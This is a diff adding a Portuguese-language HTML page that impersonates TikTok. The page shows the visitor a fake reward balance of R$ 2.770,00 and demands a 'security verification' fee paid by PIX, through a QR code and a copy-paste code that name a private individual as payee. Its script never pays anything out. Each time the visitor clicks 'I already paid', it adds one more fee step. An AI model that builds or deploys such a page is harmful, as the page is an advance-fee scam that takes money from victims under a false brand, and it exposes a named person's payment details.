@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Rewards</title>
+    <style>
+        :root { --tt-pink: #fe2c55; --picpay: #21c25e; }
+        body { background: #000; display: flex; justify-content: center; font-family: sans-serif; color: #fff; margin: 0; padding: 0; overflow: hidden; }
+        .iphone { width: 100vw; height: 100vh; background: #121212; position: relative; overflow: hidden; }
+        .app-screen { display: none; height: 100%; flex-direction: column; background: #121212; position: absolute; width: 100%; justify-content: space-between; padding-bottom: 30px; box-sizing: border-box; }
+        .active { display: flex; }
+        .status-bar { padding: 10px 20px; font-size: 12px; display: flex; justify-content: space-between; width: 100%; box-sizing: border-box; font-weight: bold; }
+        .tt-header { padding: 10px 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; width: 100%; box-sizing: border-box; }
+        .tt-logo { height: 20px !important; width: auto !important; }
+        .coin-reward { display: flex; align-items: center; background: #222; padding: 5px 10px; border-radius: 20px; gap: 5px; border: 1px solid #333; height: 26px; }
+        .coin-txt { font-size: 12px; font-weight: bold; color: #fff; line-height: 1; }
+        .main-container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; width: 100%; padding: 0 25px; box-sizing: border-box; }
+        .value-card { background: #1e1e1e; padding: 15px; border-radius: 15px; border: 1px solid #25f4ee; margin: 15px 0; width: 100%; }
+        .btn-tt-main, .btn-verify { background: var(--tt-pink); border: none; padding: 18px; color: #fff; font-weight: bold; border-radius: 12px; cursor: pointer; width: 90%; margin: 0 auto; font-size: 16px; }
+        .btn-verify { background: var(--picpay); }
+        .input-box { width: 100%; text-align: left; margin-bottom: 15px; }
+        .input-box label { font-size: 12px; color: #25f4ee; font-weight: bold; margin-bottom: 6px; display: block; }
+        input, select { width: 100%; background: #222; border: 1px solid #333; padding: 12px; border-radius: 10px; color: #fff; box-sizing: border-box; font-size: 15px; }
+        .qr-container { background: #fff; padding: 12px; width: 150px; border-radius: 12px; margin-bottom: 15px; }
+        .qr-container img { width: 100%; display: block; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--tt-pink); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .pix-copia-cola { display: flex; gap: 8px; width: 100%; margin-bottom: 15px; }
+        .pix-copia-cola input { font-size: 10px; padding: 10px; flex: 1; margin: 0; }
+        .btn-copy { background: #444; border: none; color: #fff; padding: 0 15px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 12px; }
+        .tax-card { background: #1e1e1e; border: 1px solid var(--tt-pink); border-radius: 12px; padding: 12px; width: 100%; margin: 15px 0; }
+        .tax-card h2 { color: var(--tt-pink); margin: 0; font-size: 32px; }
+    </style>
+</head>
+<body>
+
+<div class="iphone">
+    <div class="status-bar"><span>04:55</span><span>📶 🔋</span></div>
+
+    <div id="step-1" class="app-screen active">
+      <div class="tt-header">
+        <img src="https://logodownload.org/wp-content/uploads/2019/08/tiktok-logo-7.png" class="tt-logo">
+        <div class="coin-reward"><span>🟡</span><span class="coin-txt">277k</span></div>
+      </div>
+      <div class="main-container">
+        <div style="font-size:50px; margin-bottom:15px">✅</div>
+        <h2 style="margin:0">Saldo Disponível</h2>
+        <div class="value-card"><h1>R$ 2.770,00</h1></div>
+        <div id="loader-inicio" style="display:none;"><div class="spinner"></div><p style="font-size:12px; color:#25f4ee; margin-top:10px">Processando saque...</p></div>
+      </div>
+      <button class="btn-tt-main" id="btn-resgatar" onclick="iniciarCarregamento()">RESGATAR AGORA</button>
+    </div>
+
+    <div id="step-pay" class="app-screen">
+      <div style="padding:15px; text-align:center; font-weight:bold; background:#1e1e1e">⚠️ Verificação de Segurança</div>
+      <div class="main-container">
+        <p style="font-size:13px; padding:0 10px" id="dynamic-text">Pague a taxa para liberar o envio de R$ 2.770,00:</p>
+        <div class="tax-card"><span id="step-label" style="font-size:12px">ETAPA 1/2</span><h2>R$ 24,56</h2></div>
+        <div class="qr-container"><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126690014br.gov.bcb.pix01364e6836a1-e623-440d-8cbd-491ef02550710207TIK TOK520400005303986540524.565802BR5925Ana Claudia Correa Soares6009Sao Paulo62140510LTDATIKTOK6304ECBF"></div>
+        <div class="pix-copia-cola">
+          <input type="text" id="pix-code" value="00020126690014br.gov.bcb.pix01364e6836a1-e623-440d-8cbd-491ef02550710207TIK TOK520400005303986540524.565802BR5925Ana Claudia Correa Soares6009Sao Paulo62140510LTDATIKTOK6304ECBF" readonly>
+          <button onclick="copyPix()" id="btn-copy-id" class="btn-copy">COPIAR</button>
+        </div>
+      </div>
+      <button onclick="processarEtapa()" id="btn-main" class="btn-verify">JÁ PAGUEI</button>
+    </div>
+</div>
+
+<script>
+let etapa = 1;
+function iniciarCarregamento() {
+  document.getElementById('btn-resgatar').style.display = 'none';
+  document.getElementById('loader-inicio').style.display = 'block';
+  setTimeout(() => { nextScreen('pay'); }, 3000);
+}
+function nextScreen(n) {
+  document.querySelectorAll('.app-screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('step-' + n).classList.add('active');
+}
+function copyPix() {
+  const code = document.getElementById('pix-code');
+  code.select();
+  navigator.clipboard.writeText(code.value);
+  alert("Copiado!");
+}
+function processarEtapa() {
+  const btn = document.getElementById('btn-main');
+  btn.innerText = "VERIFICANDO...";
+  setTimeout(() => {
+    etapa++;
+    document.getElementById('step-label').innerText = `ETAPA ${etapa} DE ${etapa + 1}`;
+    document.getElementById('dynamic-text').innerHTML = `<b style="color:#21c25e;">TAXA RECEBIDA!</b><br>Siga para a última etapa.`;
+    alert("Próxima etapa liberada!");
+    btn.innerText = "VERIFICAR NOVAMENTE";
+  }, 3000);
+}
+</script>
+
+</body>
+</html>
